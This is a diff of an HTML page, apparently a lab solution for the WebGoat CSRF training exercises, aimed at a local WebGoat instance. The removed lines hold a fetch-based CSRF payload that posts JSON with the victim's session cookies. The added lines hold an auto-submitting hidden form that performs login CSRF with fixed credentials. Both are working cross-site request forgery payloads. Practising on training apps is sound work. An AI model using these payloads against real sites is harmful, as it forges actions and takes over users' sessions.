@@ -1,22 +1,8 @@
-<!doctype html>
 <html>
-  <body>
-    <h3>Triggering CSRF JSON via fetch(no-cors)...</h3>
-
-    <script>
-      const payload = {
-        email: "webgoat@webgoat.org",
-        message: "WebGoat is the best!",
-        name: "WebGoat",
-        subject: "service"
-      };
-
-      fetch("http://localhost:8080/WebGoat/csrf/feedback/message", {
-        method: "POST",
-        mode: "no-cors",          // prevents preflight; request still goes out
-        credentials: "include",   // sends your WebGoat session cookies
-        body: JSON.stringify(payload)
-      });
-    </script>
-  </body>
+<body onload="document.forms[0].submit()">
+    <form action="http://localhost:8080/WebGoat/login" method="POST">
+        <input type="hidden" name="username" value="csrf-kt09552n" />
+        <input type="hidden" name="password" value="newpw@9988" />
+    </form>
+</body>
 </html>
